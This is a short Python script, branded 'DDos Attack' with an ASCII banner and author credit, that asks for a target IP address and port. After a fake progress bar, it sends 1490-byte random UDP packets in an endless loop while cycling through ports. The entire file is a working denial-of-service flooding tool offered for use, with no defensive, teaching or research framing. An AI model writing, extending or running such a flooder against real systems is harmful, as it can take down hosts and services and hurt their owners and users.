import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet DDos Attack")
print()
print(" ______   ______             ______    _          ")
print("|_   _ `.|_   _ `.         .' ____ \  (_)           ")
print("  | | `. \ | | `. \  .--.  | (___ \_| __   _ .--.   ")
print("  | |  | | | |  | |/ .'`\ \ _.____`. [  | [ `/'`\]  ")
print(" _| |_.' /_| |_.' /| \__. || \____) | | |  | |      ")
print("|______.'|______.'  '.__.'  \______.'[___][___]     ")
print("Version 0.13 FINAL RELEASE STABLE") 
print("by Dami")                                                       
print()
ip = input("IP Target : ")
port = int(input("Port      : "))
os.system("clear")
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)
sent = 0
while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    port += 1
    print(f"Sent {sent} packet to {ip} through port:{port}")
    if port == 65534:
        port = 1